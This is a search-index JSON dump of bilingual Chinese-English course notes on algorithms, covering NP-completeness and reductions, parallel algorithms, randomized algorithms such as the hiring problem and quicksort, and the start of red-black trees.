\u662f\u5426\u6240\u6709\u80fd\u5728 polynomial-time \u65f6\u95f4\u5185 \u9a8c\u8bc1 \u7684\u7b97\u6cd5\u90fd\u80fd\u5728 polynomial-time \u5185\u88ab \u89e3\u51b3 Reduction and NP-Complete Problems An NP-complete problem has the property that any problem in NP can be polynomially reduced to it. reduction \u7ea6\u5316 To prove a reduction \\(A\\le_P B\\) , we require 3 steps We have to find the mapping function \\(f\\) and show that it runs in polynomial time. for all \\(x \\in A\\) , then \\(f(x) \\in B\\) If \\(f(x)\\in B\\) , then \\(x\\in A\\) \u5982\u679c \\(Q_1\\le_p Q_2\\) , \u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\uff1a A polynomial-time algorithm for \\(Q_2\\) would sufficiently imply a polynomial-time algorithm for \\(Q_1\\) . \\(Q_1\\) can be polynomially reduced to \\(Q_2\\) \u5e38\u89c1 NPC \u95ee\u9898 SAT Problem(\u7b2c\u4e00\u4e2a\u88ab\u8bc1\u660e\u4e3a NPC \u7684\u95ee\u9898): \u7ed9\u5b9a\u4e00\u4e2an\u4e2a\u5e03\u5c14\u53d8\u91cf\u7ec4\u6210\u7684\u5e03\u5c14\u8868\u8fbe\u5f0f\uff0c\u5224\u65ad\u5176\u6709\u6ca1\u6709\u53ef\u80fd\u4e3a\u771f Hamiltonian cycle Problem: \u7ed9\u5b9a\u4e00\u4e2a\u56fe\uff0c\u5224\u65ad\u662f\u5426\u6709\u4e00\u4e2asimple cycle\u6070\u597d\u7ecf\u8fc7\u6bcf\u4e2a\u9876\u70b9\u4e00\u6b21 Traveling Problem: \u7ed9\u5b9a\u4e00\u4e2a\u5e26\u6743\u56fe\uff0c\u95ee\u662f\u5426\u5b58\u5728\u4e00\u4e2asimple cycle\u7ecf\u5386\u8fc7\u6bcf\u4e2a\u8282\u70b9\u4e14\u7ecf\u5386\u8fb9\u7684\u6743\u91cd\u548c\u4e0d\u8d85\u8fc7K? Vertex Cover Problem: \u7ed9\u5b9a\u4e00\u4e2a\u56fe\uff0c\u5224\u65ad\u662f\u5426\u5b58\u5728\u5176\u4e00\u4e2a\u5927\u5c0f\u4e0d\u8d85\u8fc7K\u7684\u70b9\u96c6\uff0c\u4f7f\u5f97\u56fe\u4e2d\u4efb\u4e00\u6761\u8fb9\u81f3\u5c11\u6709\u4e00\u4e2a\u9876\u70b9\u5728\u8fd9\u4e2a\u70b9\u96c6\u4e2d clique problem: \u7ed9\u5b9a\u4e00\u4e2a\u56fe\uff0c\u5224\u65ad\u56fe\u662f\u5426\u6709\u4e00\u4e2a\u5927\u5c0f\u81f3\u5c11\u4e3aK\u7684\u5b8c\u5168\u5b50\u56fe\uff08\u56e2\uff09\u3002 NP-Hard If a NP-Hard problem is in NP, it is a HP-complete problem. \u5e38\u89c1NP-hard\u95ee\u9898 \u6240\u6709NP-Complete\u95ee\u9898 Halting problem(\u4e0d\u5c5e\u4e8eNP-Complete) Formal-language Theory* An alphabet \\(\\Sigma\\) is a finite set of symbols A language \\(L\\) over \\(\\Sigma\\) is any set of strings mode up of symbols from \\(\\Sigma\\) Denote empty string be \\(\\varepsilon\\) Denote empty language by \\(\\emptyset\\) Language of all strings over \\(\\Sigma\\) is denoted by \\(\\Sigma^{\\star}\\) The complement of \\(L\\) is denoted by \\(\\Sigma^{\\star}-L\\) The concatenation of two languages \\(L_1\\) and \\(L_2\\) is the language \\(L=\\{x_1x_2: x_1\\in L_1\\ {\\rm and}\\ x_2\\in L_2\\}\\) The closure of Kleene star of a language \\(L\\) is the language \\(L^{\\star}=\\{\\varepsilon\\}\\cup L\\cup L^2\\cup L^3\\cup \\cdots\\) , where \\(L^k\\) is the language obtained by cocncatenating \\(L\\) to itself \\(k\\) times","title":"NP Completeness"},{"location":"course/ads/np/#np-completeness","text":"Decision problem (yes/no) Search problem (find the answer) Optimization problem","title":"NP Completeness"},{"location":"course/ads/np/#nondeterministic-turing-machine","text":"A Deterministic Turing Machine executes one instruction at each point in time. And then depending on the instruction, it goes to the next unique instruction. A Nondeterminism is now typically represented by giving a machine an extra input, the certificate or witness.","title":"Nondeterministic Turing machine"},{"location":"course/ads/np/#np","text":"NP: Nondeterministic polynomial-time NP Problem: \u5728 polynomial-time \u65f6\u95f4\u5185\u53ef\u4ee5\u9a8c\u8bc1\u7684\u95ee\u9898\u3002 \\(NP \\overset{?}{=} P\\) : \u662f\u5426\u6240\u6709\u80fd\u5728 polynomial-time \u65f6\u95f4\u5185 \u9a8c\u8bc1 \u7684\u7b97\u6cd5\u90fd\u80fd\u5728 polynomial-time \u5185\u88ab \u89e3\u51b3","title":"NP"},{"location":"course/ads/np/#reduction-and-np-complete-problems","text":"An NP-complete problem has the property that any problem in NP can be polynomially reduced to it.","title":"Reduction and NP-Complete Problems"},{"location":"course/ads/np/#reduction","text":"To prove a reduction \\(A\\le_P B\\) , we require 3 steps We have to find the mapping function \\(f\\) and show that it runs in polynomial time. for all \\(x \\in A\\) , then \\(f(x) \\in B\\) If \\(f(x)\\in B\\) , then \\(x\\in A\\) \u5982\u679c \\(Q_1\\le_p Q_2\\) , \u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\uff1a A polynomial-time algorithm for \\(Q_2\\) would sufficiently imply a polynomial-time algorithm for \\(Q_1\\) . \\(Q_1\\) can be polynomially reduced to \\(Q_2\\)","title":"reduction \u7ea6\u5316"},{"location":"course/ads/np/#npc","text":"SAT Problem(\u7b2c\u4e00\u4e2a\u88ab\u8bc1\u660e\u4e3a NPC \u7684\u95ee\u9898): \u7ed9\u5b9a\u4e00\u4e2an\u4e2a\u5e03\u5c14\u53d8\u91cf\u7ec4\u6210\u7684\u5e03\u5c14\u8868\u8fbe\u5f0f\uff0c\u5224\u65ad\u5176\u6709\u6ca1\u6709\u53ef\u80fd\u4e3a\u771f Hamiltonian cycle Problem: \u7ed9\u5b9a\u4e00\u4e2a\u56fe\uff0c\u5224\u65ad\u662f\u5426\u6709\u4e00\u4e2asimple cycle\u6070\u597d\u7ecf\u8fc7\u6bcf\u4e2a\u9876\u70b9\u4e00\u6b21 Traveling Problem: \u7ed9\u5b9a\u4e00\u4e2a\u5e26\u6743\u56fe\uff0c\u95ee\u662f\u5426\u5b58\u5728\u4e00\u4e2asimple cycle\u7ecf\u5386\u8fc7\u6bcf\u4e2a\u8282\u70b9\u4e14\u7ecf\u5386\u8fb9\u7684\u6743\u91cd\u548c\u4e0d\u8d85\u8fc7K? Vertex Cover Problem: \u7ed9\u5b9a\u4e00\u4e2a\u56fe\uff0c\u5224\u65ad\u662f\u5426\u5b58\u5728\u5176\u4e00\u4e2a\u5927\u5c0f\u4e0d\u8d85\u8fc7K\u7684\u70b9\u96c6\uff0c\u4f7f\u5f97\u56fe\u4e2d\u4efb\u4e00\u6761\u8fb9\u81f3\u5c11\u6709\u4e00\u4e2a\u9876\u70b9\u5728\u8fd9\u4e2a\u70b9\u96c6\u4e2d clique problem: \u7ed9\u5b9a\u4e00\u4e2a\u56fe\uff0c\u5224\u65ad\u56fe\u662f\u5426\u6709\u4e00\u4e2a\u5927\u5c0f\u81f3\u5c11\u4e3aK\u7684\u5b8c\u5168\u5b50\u56fe\uff08\u56e2\uff09\u3002","title":"\u5e38\u89c1 NPC \u95ee\u9898"},{"location":"course/ads/np/#np-hard","text":"If a NP-Hard problem is in NP, it is a HP-complete problem.","title":"NP-Hard"},{"location":"course/ads/np/#np-hard_1","text":"\u6240\u6709NP-Complete\u95ee\u9898 Halting problem(\u4e0d\u5c5e\u4e8eNP-Complete)","title":"\u5e38\u89c1NP-hard\u95ee\u9898"},{"location":"course/ads/np/#formal-language-theory","text":"An alphabet \\(\\Sigma\\) is a finite set of symbols A language \\(L\\) over \\(\\Sigma\\) is any set of strings mode up of symbols from \\(\\Sigma\\) Denote empty string be \\(\\varepsilon\\) Denote empty language by \\(\\emptyset\\) Language of all strings over \\(\\Sigma\\) is denoted by \\(\\Sigma^{\\star}\\) The complement of \\(L\\) is denoted by \\(\\Sigma^{\\star}-L\\) The concatenation of two languages \\(L_1\\) and \\(L_2\\) is the language \\(L=\\{x_1x_2: x_1\\in L_1\\ {\\rm and}\\ x_2\\in L_2\\}\\) The closure of Kleene star of a language \\(L\\) is the language \\(L^{\\star}=\\{\\varepsilon\\}\\cup L\\cup L^2\\cup L^3\\cup \\cdots\\) , where \\(L^k\\) is the language obtained by cocncatenating \\(L\\) to itself \\(k\\) times","title":"Formal-language Theory*"},{"location":"course/ads/para/","text":"Parallel Algorithms Parallel Random Access Machine (PRAM) Exclusive-Read Exclusive-Write (EREW) Concurrent-Read Exclusive-Write (CREW) Concurrent-Read Concurrent-Write (CRCW) Work-Depth(WD) \u76f8\u6bd4\u4e8ePRAM\uff0cWD\u7684\u6bcf\u4e2a\u65f6\u949f\u5185\uff0c\u4e0d\u4e00\u5b9a\u6240\u6709CPU\u90fd\u5728\u5de5\u4f5c Measuring the performance W(n): \u89e3\u51b3\u95ee\u9898\u6240\u8981\u7684\u57fa\u672c\u64cd\u4f5c\u6570\u91cf T(n): \u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6\uff0c\u5305\u62ec\u8ba1\u7b97\u65f6\u95f4\u548c\u5e76\u884c\u65f6\u95f4\u4e24\u90e8\u5206\u3002 \\[ \\rm{Time\\ Cost} = \\begin{cases} T(n) &P(n)>\\frac{W(n)}{T(n)}\\\\ W(n)/P(n) &P(n) \\le \\frac{W(n)}{T(n)}\\\\ T(n)+W(n)/P(n) & for\\ all\\ P(n)\\\\ \\end{cases} \\] Summation Problem PRAM Model \u5bf9\u4e8e\u7a7a\u95f2\u7684CPU\uff0c\u5fc5\u987b\u7b49\u5f85\u3002 WD Presentation \\(W(N)=O(N)\\) \\(T(N) = O(\\log{N})\\) Prefix-Sums \u95ee\u9898\uff1a\u5229\u7528\u5e76\u884c\u7b97\u6cd5\u6c42\u524d\u7f00\u548c \u7b97\u6cd5\uff1a\u81ea\u5e95\u81f3\u4e0a\u8ba1\u7b97B()\uff0c\u81ea\u9876\u5411\u4e0b\u8ba1\u7b97C() B(): \u8ba1\u7b97\u5b50\u6811\u548c C(): \u8ba1\u7b97\u524d\u7f00\u548c \\[ \\begin{cases} C(h,i)=B(h,i)& i==1\\\\ C(h,i)=C(h+1,i)& i\u4e3a\u5076\u6570\\\\ C(h,i)=C(h+1,\\frac{i-1}{2})+B(h,i) & i\u4e3a\u5947\u6570\u4e14\u5927\u4e8e1 \\end{cases} \\] \\(T(N)=O(\\log{N})\\) \\(W(N)=O(N)\\) Merging/Ranking Problem \u95ee\u9898\uff1a\u5229\u7528\u5e76\u884c\u7b97\u6cd5\u5408\u5e76\u6709\u5e8f\u5e8f\u5217 \u7b97\u6cd5 \u8981\u5408\u5e76\u4e24\u4e2a\u6709\u5e8f\u5e8f\u5217\uff0c\u9700\u8981\u5148\u77e5\u9053\u4ed6\u4eec\u6bcf\u4e2a\u5143\u7d20\u5728\u5bf9\u65b9\u5e8f\u5217\u4e2d\u7684\u6392\u540d\uff0c\u8bb0\u4e3a Rank \u6743\u8861\u4e8c\u5206\u67e5\u627e\u548c\u987a\u5e8f\u904d\u5386\u7684\u5229\u5f0a\uff0c\u91c7\u53d6\u5206\u5757\u7684\u65b9\u5f0f \u7b2c\u4e00\u6b65(Partitioning)\uff1a\u5728\u4e24\u4e2a\u5e8f\u5217\u4e2d\u5404\u5747\u5300\u53d6 \\(\\frac{N}{\\log{N}}\\) \u4e2a\u5143\u7d20\uff0c\u91c7\u7528\u4e8c\u5206\u67e5\u627e\u7684\u65b9\u6cd5\u83b7\u53d6\u5176\u4f4d\u7f6e \u7b2c\u4e8c\u6b65(Actual Ranking)\uff1a\u5bf9\u4e8e\u5df2\u77e5Rank\u5143\u7d20\u4e4b\u95f4\u7684\u5143\u7d20\uff0c\u91c7\u53d6\u987a\u5e8f\u904d\u5386\u7684\u65b9\u5f0f \\(T(N)=O(\\log{N})\\) \\(W(N)=O(N)\\) Maximum Finding replace '+' by 'max' in the summation algorithm \\(T(N)=O(\\log{N})\\) \\(W(N)=O(N)\\) \u5927\u529f\u7387\u8dd1\u8f66\u6cd5 \\(T(N)=O(1)\\) \\(W(N)=O(N^2)\\) Doubly-logarithmic Paradigm \u65b9\u6839\u5206\u7ec4\u6cd5\uff1a\u628a\u5e8f\u5217\u5206\u6210 \\(\\sqrt{n}\\) \u7ec4\uff0c\u9012\u5f52\u6b64\u65b9\u6cd5\uff0c\u5728\u627e\u5230\u6700\u5927\u503c\u540e\uff0c\u4f7f\u7528\u5927\u529f\u7387\u8dd1\u8f66\u6cd5\u5408\u5e76 \u6709 \\(T(n)\\le T(\\sqrt{n})+1\\) \uff0c \\(W(n)\\le\\sqrt{n}W(\\sqrt{n})+n\\) \\(T(N)=O(\\log\\log{N})\\) \\(W(N)=O(N\\log\\log{N})\\) \u53cc\u5bf9\u6570\u5206\u7ec4\u6cd5: \u628a\u5e8f\u5217\u5206\u6210 \\(N/\\log\\log{n}\\) \u7ec4\uff0c\u9012\u5f52\u6b64\u65b9\u6cd5\uff0c\u5728\u627e\u5230\u6700\u5927\u503c\u540e\uff0c\u4f7f\u7528\u5927\u529f\u7387\u8dd1\u8f66\u6cd5\u5408\u5e76 \u6709 \\(T(n)\\le T(n/\\log\\log{n})+1\\) \uff0c \\(W(n)\\le(n/\\log\\log{n})W(n/\\log\\log{n})+n\\) \\(T(N)=O(\\log\\log{N})\\) \\(W(N)=O(N)\\) Random Sampleing \u7b97\u6cd5\u6d41\u7a0b\uff1a \\(T(N)=O(1)\\) \\(W(N)=O(N)\\) \u6781\u5927\u7684\u6982\u7387\u5f97\u5230\u6b63\u786e\u7b54\u6848\uff0c\u4e0d\u6b63\u786e\u7684\u6982\u7387\u4ec5\u4e3a \\(O(1/n^c)\\)","title":"Parallel Algorithms"},{"location":"course/ads/para/#parallel-algorithms","text":"","title":"Parallel Algorithms"},{"location":"course/ads/para/#parallel-random-access-machine-pram","text":"Exclusive-Read Exclusive-Write (EREW) Concurrent-Read Exclusive-Write (CREW) Concurrent-Read Concurrent-Write (CRCW)","title":"Parallel Random Access Machine (PRAM)"},{"location":"course/ads/para/#work-depthwd","text":"\u76f8\u6bd4\u4e8ePRAM\uff0cWD\u7684\u6bcf\u4e2a\u65f6\u949f\u5185\uff0c\u4e0d\u4e00\u5b9a\u6240\u6709CPU\u90fd\u5728\u5de5\u4f5c","title":"Work-Depth(WD)"},{"location":"course/ads/para/#measuring-the-performance","text":"W(n): \u89e3\u51b3\u95ee\u9898\u6240\u8981\u7684\u57fa\u672c\u64cd\u4f5c\u6570\u91cf T(n): \u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6\uff0c\u5305\u62ec\u8ba1\u7b97\u65f6\u95f4\u548c\u5e76\u884c\u65f6\u95f4\u4e24\u90e8\u5206\u3002 \\[ \\rm{Time\\ Cost} = \\begin{cases} T(n) &P(n)>\\frac{W(n)}{T(n)}\\\\ W(n)/P(n) &P(n) \\le \\frac{W(n)}{T(n)}\\\\ T(n)+W(n)/P(n) & for\\ all\\ P(n)\\\\ \\end{cases} \\]","title":"Measuring the performance"},{"location":"course/ads/para/#summation-problem","text":"","title":"Summation Problem"},{"location":"course/ads/para/#pram-model","text":"\u5bf9\u4e8e\u7a7a\u95f2\u7684CPU\uff0c\u5fc5\u987b\u7b49\u5f85\u3002","title":"PRAM Model"},{"location":"course/ads/para/#wd-presentation","text":"\\(W(N)=O(N)\\) \\(T(N) = O(\\log{N})\\)","title":"WD Presentation"},{"location":"course/ads/para/#prefix-sums","text":"\u95ee\u9898\uff1a\u5229\u7528\u5e76\u884c\u7b97\u6cd5\u6c42\u524d\u7f00\u548c \u7b97\u6cd5\uff1a\u81ea\u5e95\u81f3\u4e0a\u8ba1\u7b97B()\uff0c\u81ea\u9876\u5411\u4e0b\u8ba1\u7b97C() B(): \u8ba1\u7b97\u5b50\u6811\u548c C(): \u8ba1\u7b97\u524d\u7f00\u548c \\[ \\begin{cases} C(h,i)=B(h,i)& i==1\\\\ C(h,i)=C(h+1,i)& i\u4e3a\u5076\u6570\\\\ C(h,i)=C(h+1,\\frac{i-1}{2})+B(h,i) & i\u4e3a\u5947\u6570\u4e14\u5927\u4e8e1 \\end{cases} \\] \\(T(N)=O(\\log{N})\\) \\(W(N)=O(N)\\)","title":"Prefix-Sums"},{"location":"course/ads/para/#mergingranking-problem","text":"\u95ee\u9898\uff1a\u5229\u7528\u5e76\u884c\u7b97\u6cd5\u5408\u5e76\u6709\u5e8f\u5e8f\u5217 \u7b97\u6cd5 \u8981\u5408\u5e76\u4e24\u4e2a\u6709\u5e8f\u5e8f\u5217\uff0c\u9700\u8981\u5148\u77e5\u9053\u4ed6\u4eec\u6bcf\u4e2a\u5143\u7d20\u5728\u5bf9\u65b9\u5e8f\u5217\u4e2d\u7684\u6392\u540d\uff0c\u8bb0\u4e3a Rank \u6743\u8861\u4e8c\u5206\u67e5\u627e\u548c\u987a\u5e8f\u904d\u5386\u7684\u5229\u5f0a\uff0c\u91c7\u53d6\u5206\u5757\u7684\u65b9\u5f0f \u7b2c\u4e00\u6b65(Partitioning)\uff1a\u5728\u4e24\u4e2a\u5e8f\u5217\u4e2d\u5404\u5747\u5300\u53d6 \\(\\frac{N}{\\log{N}}\\) \u4e2a\u5143\u7d20\uff0c\u91c7\u7528\u4e8c\u5206\u67e5\u627e\u7684\u65b9\u6cd5\u83b7\u53d6\u5176\u4f4d\u7f6e \u7b2c\u4e8c\u6b65(Actual Ranking)\uff1a\u5bf9\u4e8e\u5df2\u77e5Rank\u5143\u7d20\u4e4b\u95f4\u7684\u5143\u7d20\uff0c\u91c7\u53d6\u987a\u5e8f\u904d\u5386\u7684\u65b9\u5f0f \\(T(N)=O(\\log{N})\\) \\(W(N)=O(N)\\)","title":"Merging/Ranking Problem"},{"location":"course/ads/para/#maximum-finding","text":"","title":"Maximum Finding"},{"location":"course/ads/para/#replace-by-max-in-the-summation-algorithm","text":"\\(T(N)=O(\\log{N})\\) \\(W(N)=O(N)\\)","title":"replace '+' by 'max' in the summation algorithm"},{"location":"course/ads/para/#_1","text":"\\(T(N)=O(1)\\) \\(W(N)=O(N^2)\\)","title":"\u5927\u529f\u7387\u8dd1\u8f66\u6cd5"},{"location":"course/ads/para/#doubly-logarithmic-paradigm","text":"\u65b9\u6839\u5206\u7ec4\u6cd5\uff1a\u628a\u5e8f\u5217\u5206\u6210 \\(\\sqrt{n}\\) \u7ec4\uff0c\u9012\u5f52\u6b64\u65b9\u6cd5\uff0c\u5728\u627e\u5230\u6700\u5927\u503c\u540e\uff0c\u4f7f\u7528\u5927\u529f\u7387\u8dd1\u8f66\u6cd5\u5408\u5e76 \u6709 \\(T(n)\\le T(\\sqrt{n})+1\\) \uff0c \\(W(n)\\le\\sqrt{n}W(\\sqrt{n})+n\\) \\(T(N)=O(\\log\\log{N})\\) \\(W(N)=O(N\\log\\log{N})\\) \u53cc\u5bf9\u6570\u5206\u7ec4\u6cd5: \u628a\u5e8f\u5217\u5206\u6210 \\(N/\\log\\log{n}\\) \u7ec4\uff0c\u9012\u5f52\u6b64\u65b9\u6cd5\uff0c\u5728\u627e\u5230\u6700\u5927\u503c\u540e\uff0c\u4f7f\u7528\u5927\u529f\u7387\u8dd1\u8f66\u6cd5\u5408\u5e76 \u6709 \\(T(n)\\le T(n/\\log\\log{n})+1\\) \uff0c \\(W(n)\\le(n/\\log\\log{n})W(n/\\log\\log{n})+n\\) \\(T(N)=O(\\log\\log{N})\\) \\(W(N)=O(N)\\)","title":"Doubly-logarithmic Paradigm"},{"location":"course/ads/para/#random-sampleing","text":"\u7b97\u6cd5\u6d41\u7a0b\uff1a \\(T(N)=O(1)\\) \\(W(N)=O(N)\\) \u6781\u5927\u7684\u6982\u7387\u5f97\u5230\u6b63\u786e\u7b54\u6848\uff0c\u4e0d\u6b63\u786e\u7684\u6982\u7387\u4ec5\u4e3a \\(O(1/n^c)\\)","title":"Random Sampleing"},{"location":"course/ads/random/","text":"Randomized Algorithms Monte Carlo method efficient raodomized algorithms that only need to yield the correct answer with high probability. Las Vegas algorithm randomized algorithms that are always correct, and run efficiently in expectation. Hiring Problem \u4f9d\u6b21\u9762\u8bd5 \\(N\\) \u4e2a\u4eba\uff0c\u76ee\u7684\u662f\u627e\u5230\u6700\u597d\u7684\u90a3\u4e2a\u4eba\u3002\u6bcf\u4e2a\u4eba\u9762\u8bd5\u5b8c\u5fc5\u987b\u9a6c\u4e0a\u544a\u77e5\u662f\u5426\u5f55\u7528\uff0c\u5982\u679c\u5df2\u5f55\u7528\uff0c\u5fc5\u987b\u652f\u4ed8\u4ee3\u4ef7 \\(Ch\\) \uff0c\u6bcf\u6b21\u9762\u8bd5\u4e5f\u6709\u4ee3\u4ef7 \\(Ci\\) \uff0c\u4f46\u662f \\(Ci\\ll Ch\\) \u3002 \u4e00\u822c\u7b97\u6cd5 \uff1a\u4f9d\u6b21\u9762\u8bd5\uff0c\u671f\u671b\u65f6\u95f4\u5f00\u9500\u4e3a \\(Ch\\times \\log N + Ci\\times N\\) \u56e0\u4e3a\u5bf9\u4e8e\u7b2c \\(i\\) \u4e2a\u4eba\uff0c\u6bd4\u524d\u9762 \\(i-1\\) \u4e2a\u4eba\u90fd\u4f18\u79c0\u7684\u6982\u7387\u4e3a \\(\\frac{1}{i}\\) \uff0c \\(\\sum\\limits^{N}_{i=1} \\frac{1}{i}=\\ln{N}\\) Online Hiring Algorithm \uff1a\u4f9d\u6b21\u9762\u8bd5\u524d\u9762 \\(k\\) \u4e2a\u4eba\uff0c\u540e\u9762k+1~N\u7684\u4eba\u4e2d\uff0c\u82e5\u6709\u6bd4\u524d\u9762k\u4e2a\u4eba\u4f18\u79c0\u7684\uff0c\u5c31\u76f4\u63a5\u5f55\u7528\uff0c\u5e76\u7ed3\u675f\u9762\u8bd5 \u5b9a\u4e49\u4e24\u4e2a\u4e8b\u4ef6 \u4e8b\u4ef6A: \u5728\u6700\u4f18\u79c0\u7684\u5458\u5de5\u5728\u4f4d\u7f6e \\(i\\) \u4e8b\u4ef6B: \u4f4d\u7f6e\u5728k+1~i-1\u7684\u5458\u5de5\u6ca1\u6709\u4e00\u4e2a\u88ab\u96c7\u4f63 A\u548cB\u76f8\u4e92\u72ec\u7acb\uff0c\u5bf9\u4e8eA\uff0c\u6982\u7387\u4e3a \\(\\frac{1}{N}\\) \uff1b\u5bf9\u4e8eB\uff0c\u6982\u7387\u4e3a \\(\\frac{k}{i-1}\\) (\u524di-1\u4e2a\u5458\u5de5\u4e2d\u6700\u4f18\u79c0\u7684\u5728\u524dk\u4e2a\u4f4d\u7f6e\u4e2d) \u80fd\u96c7\u4f63\u5230\u6700\u4f18\u79c0\u5458\u5de5\u7684\u6982\u7387\u4e3a \\(\\frac{k}{N}\\ln(\\frac{N}{k})\\le Pr[S]\\le \\frac{k}{N}\\ln(\\frac{N-1}{k-1})\\) \uff0c \\(Pr[S]=\\frac{k}{N}\\sum\\limits^{N-1}_{i=k}\\frac{1}{i}\\) \u5927\u7ea6\u5728 \\(k=\\frac{N}{e}\\) \uff0c\u6982\u7387\u53d6\u5230\u6700\u5927\u503c Quick Sort time complexity proof \u5047\u8bbe \\(A^{j}_{i}\\) \u4e3a\u7b2ci\u4f4d\u548c\u7b2cj\u4f4d\u8fdb\u884c\u6bd4\u8f83\u7684\u4e8b\u4ef6\uff0c\u6613\u77e5\u53ea\u6709\u7b2ci+1...j-1\u4f4d\u6ca1\u6709\u88ab\u9009\u6210pivot\u65f6\u8be5\u4e8b\u4ef6\u624d\u4f1a\u53d1\u751f\uff0c\u6545 \\(P(A^{j}_{i})=\\frac{2}{j-i+1}\\) \\(T=\\sum\\limits_{j}\\sum\\limits_{i}P(A^{j}_{i}) = O(n\\log{n})\\) Modified Quick Sort central splitter\uff1a\u5c06\u6570\u7ec4\u5206\u6210\u4e24\u6bb5\u7684pivot\u5e76\u4e14\u6bcf\u6bb5\u81f3\u5c11\u662f\u603b\u957f\u5ea6\u76841/4 Modified Quicksort\uff1a\u5728\u5f00\u59cb\u9012\u5f52\u4e4b\u524d\u9009\u62e9\u51fa\u4e00\u4e2a\u4e2d\u5fc3\u5206\u5272\u70b9 \u9009\u51faModified Quicksort\u7684\u671f\u671b\u6b21\u6570\u4e3a2\uff08\u56e0\u4e3a\u6ee1\u8db3\u6761\u4ef6\u7684\u70b9\u5171\u5360 \\(\\frac{1}{2}\\) \uff09","title":"Randomized Algorithms"},{"location":"course/ads/random/#randomized-algorithms","text":"","title":"Randomized Algorithms"},{"location":"course/ads/random/#monte-carlo-method","text":"efficient raodomized algorithms that only need to yield the correct answer with high probability.","title":"Monte Carlo method"},{"location":"course/ads/random/#las-vegas-algorithm","text":"randomized algorithms that are always correct, and run efficiently in expectation.","title":"Las Vegas algorithm"},{"location":"course/ads/random/#hiring-problem","text":"\u4f9d\u6b21\u9762\u8bd5 \\(N\\) \u4e2a\u4eba\uff0c\u76ee\u7684\u662f\u627e\u5230\u6700\u597d\u7684\u90a3\u4e2a\u4eba\u3002\u6bcf\u4e2a\u4eba\u9762\u8bd5\u5b8c\u5fc5\u987b\u9a6c\u4e0a\u544a\u77e5\u662f\u5426\u5f55\u7528\uff0c\u5982\u679c\u5df2\u5f55\u7528\uff0c\u5fc5\u987b\u652f\u4ed8\u4ee3\u4ef7 \\(Ch\\) \uff0c\u6bcf\u6b21\u9762\u8bd5\u4e5f\u6709\u4ee3\u4ef7 \\(Ci\\) \uff0c\u4f46\u662f \\(Ci\\ll Ch\\) \u3002 \u4e00\u822c\u7b97\u6cd5 \uff1a\u4f9d\u6b21\u9762\u8bd5\uff0c\u671f\u671b\u65f6\u95f4\u5f00\u9500\u4e3a \\(Ch\\times \\log N + Ci\\times N\\) \u56e0\u4e3a\u5bf9\u4e8e\u7b2c \\(i\\) \u4e2a\u4eba\uff0c\u6bd4\u524d\u9762 \\(i-1\\) \u4e2a\u4eba\u90fd\u4f18\u79c0\u7684\u6982\u7387\u4e3a \\(\\frac{1}{i}\\) \uff0c \\(\\sum\\limits^{N}_{i=1} \\frac{1}{i}=\\ln{N}\\) Online Hiring Algorithm \uff1a\u4f9d\u6b21\u9762\u8bd5\u524d\u9762 \\(k\\) \u4e2a\u4eba\uff0c\u540e\u9762k+1~N\u7684\u4eba\u4e2d\uff0c\u82e5\u6709\u6bd4\u524d\u9762k\u4e2a\u4eba\u4f18\u79c0\u7684\uff0c\u5c31\u76f4\u63a5\u5f55\u7528\uff0c\u5e76\u7ed3\u675f\u9762\u8bd5 \u5b9a\u4e49\u4e24\u4e2a\u4e8b\u4ef6 \u4e8b\u4ef6A: \u5728\u6700\u4f18\u79c0\u7684\u5458\u5de5\u5728\u4f4d\u7f6e \\(i\\) \u4e8b\u4ef6B: \u4f4d\u7f6e\u5728k+1~i-1\u7684\u5458\u5de5\u6ca1\u6709\u4e00\u4e2a\u88ab\u96c7\u4f63 A\u548cB\u76f8\u4e92\u72ec\u7acb\uff0c\u5bf9\u4e8eA\uff0c\u6982\u7387\u4e3a \\(\\frac{1}{N}\\) \uff1b\u5bf9\u4e8eB\uff0c\u6982\u7387\u4e3a \\(\\frac{k}{i-1}\\) (\u524di-1\u4e2a\u5458\u5de5\u4e2d\u6700\u4f18\u79c0\u7684\u5728\u524dk\u4e2a\u4f4d\u7f6e\u4e2d) \u80fd\u96c7\u4f63\u5230\u6700\u4f18\u79c0\u5458\u5de5\u7684\u6982\u7387\u4e3a \\(\\frac{k}{N}\\ln(\\frac{N}{k})\\le Pr[S]\\le \\frac{k}{N}\\ln(\\frac{N-1}{k-1})\\) \uff0c \\(Pr[S]=\\frac{k}{N}\\sum\\limits^{N-1}_{i=k}\\frac{1}{i}\\) \u5927\u7ea6\u5728 \\(k=\\frac{N}{e}\\) \uff0c\u6982\u7387\u53d6\u5230\u6700\u5927\u503c","title":"Hiring Problem"},{"location":"course/ads/random/#quick-sort","text":"","title":"Quick Sort"},{"location":"course/ads/random/#time-complexity-proof","text":"\u5047\u8bbe \\(A^{j}_{i}\\) \u4e3a\u7b2ci\u4f4d\u548c\u7b2cj\u4f4d\u8fdb\u884c\u6bd4\u8f83\u7684\u4e8b\u4ef6\uff0c\u6613\u77e5\u53ea\u6709\u7b2ci+1...j-1\u4f4d\u6ca1\u6709\u88ab\u9009\u6210pivot\u65f6\u8be5\u4e8b\u4ef6\u624d\u4f1a\u53d1\u751f\uff0c\u6545 \\(P(A^{j}_{i})=\\frac{2}{j-i+1}\\) \\(T=\\sum\\limits_{j}\\sum\\limits_{i}P(A^{j}_{i}) = O(n\\log{n})\\)","title":"time complexity proof"},{"location":"course/ads/random/#modified-quick-sort","text":"central splitter\uff1a\u5c06\u6570\u7ec4\u5206\u6210\u4e24\u6bb5\u7684pivot\u5e76\u4e14\u6bcf\u6bb5\u81f3\u5c11\u662f\u603b\u957f\u5ea6\u76841/4 Modified Quicksort\uff1a\u5728\u5f00\u59cb\u9012\u5f52\u4e4b\u524d\u9009\u62e9\u51fa\u4e00\u4e2a\u4e2d\u5fc3\u5206\u5272\u70b9 \u9009\u51faModified Quicksort\u7684\u671f\u671b\u6b21\u6570\u4e3a2\uff08\u56e0\u4e3a\u6ee1\u8db3\u6761\u4ef6\u7684\u70b9\u5171\u5360 \\(\\frac{1}{2}\\) \uff09","title":"Modified Quick Sort"},{"location":"course/ads/rb/","text":"Red-Black Trees Definition Every node is either red or black The root is black Every leaf(NIL) is black If a node is red, then both its children are black For each node, all simple paths from the node to descendant leaves contain the same number of black nodes Lemma A red-black tree with n internal nodes has height at most \\(2\\ln(N+1)\\) Proof $$ \\begin{aligned} {\\rm sizeof}(x) &= 1+2{\\rm sizeof}(child)\\ &\\ge 1+2\\cdot2^{bh(child)}\\ 